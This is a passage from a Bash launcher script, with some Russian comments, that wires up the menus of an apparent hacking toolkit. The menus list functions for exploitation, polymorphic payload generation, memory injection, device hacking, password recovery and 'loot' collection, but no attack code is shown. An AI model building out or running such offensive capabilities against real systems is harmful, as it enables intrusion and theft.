    local names="Smart_OSINT_Engine Network_Intelligence"
    local funcs="run_smart_osint_engine  run_network_analyzer"
    prime_dynamic_controller "INTELLIGENCE" "$names" "$funcs"
}

menu_system_core() {
    core_engine_ui "h" "SYSTEM CORE: MAINTENANCE & INFO"
    local names="System_Info Sync_DNS Update_OS Update_Launcher Clean_Logs System_Pulse"
    local funcs="run_system_info core_network_dns_sync run_sys_update run_update_prime run_logs_cleaner run_system_pulse"
    prime_dynamic_controller "SYSTEM_CORE" "$names" "$funcs"
}

menu_forensics() {
    core_engine_ui "h" "SECTOR F: DATA FORENSICS & RECOVERY"
    local names="ADAPTIVE_ANALYZE Disk_Raw_Recovery Document_Sanitizer Forensic_Loot"
    local funcs="run_auto_forensics run_raw_recovery run_doc_cleaner run_loot_viewer"
    prime_dynamic_controller "DATA_FORENSICS" "$names" "$funcs"
}

menu_cyber_ops() {
    core_engine_ui "h" "CYBER OPERATIONS SECTOR"
    local names="Ghost_Commander PC_Control Ultimate_Exploit Omega_Auditor Polymorph_Gen"
    local funcs="run_ghost_commander pc_password_recovery run_prime_exploiter_v5  run_prime_auditor_v2 generate_poly_payload"
    prime_dynamic_controller "CYBER_OPS" "$names" "$funcs"
}

menu_crypto_lab() {
    core_engine_ui "h" "SECTOR C: CRYPTOGRAPHY & STEGANOGRAPHY"
    local names="Hash_Analyzer File_Encryptor Stegano_Deep_Hide SSH_Key_Gen"
    local funcs="run_hash_analyzer run_file_cryptor run_stegano_lab run_ssh_keygen"
    prime_dynamic_controller "CRYPTO_LAB" "$names" "$funcs"
}

menu_net_infra() {
    core_engine_ui "h" "NETWORK INFRASTRUCTURE"
    local names="Device_Hack Mesh_Bridge Server_Control Phantom_Engine"
    local funcs="run_device_hack run_mesh_bridge run_servers run_phantom_engine"
    prime_dynamic_controller "NET_INFRA" "$names" "$funcs"
}

menu_core_lab() {
    core_engine_ui "h" "CORE RESEARCH LAB"
    local names="Mem_Injection Packet_Forge WiFi_Pulse Kernel_Audit"
    local funcs="run_mem_inject run_packet_forge run_wifi_pulse run_kernel_check"
    prime_dynamic_controller "CORE_LAB" "$names" "$funcs"
}

menu_financial_shield() {
    core_engine_ui "h" "FINANCIAL SHIELD: BANKING GAMBIT"
    local names="IBAN_Validator Gambit_Strategy Transaction_Audit Secure_Wallet"
    local funcs="run_iban_analyzer run_gambit_info run_trans_audit run_wallet_manager"
    prime_dynamic_controller "FIN_SHIELD" "$names" "$funcs"
}

menu_deep_bridge() {
    core_engine_ui "h" "DEEP BRIDGE: DATA CORRELATION"
    local names="Artifact_Linker Loot_Collector Knowledge_Graph Session_Export"
    local funcs="run_artifact_linker run_loot_collector run_k_graph run_session_export"
    prime_dynamic_controller "DEEP_BRIDGE" "$names" "$funcs"
}

menu_stealth_comms() {
    # 1. Запуск прогресс-бара для красоты перехода
    core_engine_progress 1 "STEALTH_COMMS"    
    # 2. Имена для отображения в меню (красивые)
    local names="Live_Node_AV Shared_Node_Store Upload_Portal Node_Destroy"    
    # 3. РЕАЛЬНЫЕ имена функций из твоего кода (исправлено)
    local funcs="run_av_server run_share_server run_upload_server run_node_clean"    
    # 4. Запуск через контроллер
    prime_dynamic_controller "STEALTH_COMMS" "$names" "$funcs"
}


run_main_menu() {
    local main_names="CYBER_OPS INTELLIGENCE CRYPTO_LAB NET_INFRA FIN_SHIELD STEALTH_COMMS SYSTEM_CORE CORE_LAB DATA_FORENSICS DEEP_BRIDGE PASSWORD EXIT"
    local main_funcs="menu_cyber_ops menu_intelligence menu_crypto_lab menu_net_infra menu_financial_shield menu_stealth_comms menu_system_core menu_core_lab menu_forensics menu_deep_bridge run_pass_lab exit_script"
    
    prime_dynamic_controller "PRIME MASTER EXECUTIVE" "$main_names" "$main_funcs"
}


# --- ТОЧКА ЗАПУСКА ---
clear
run_main_menu
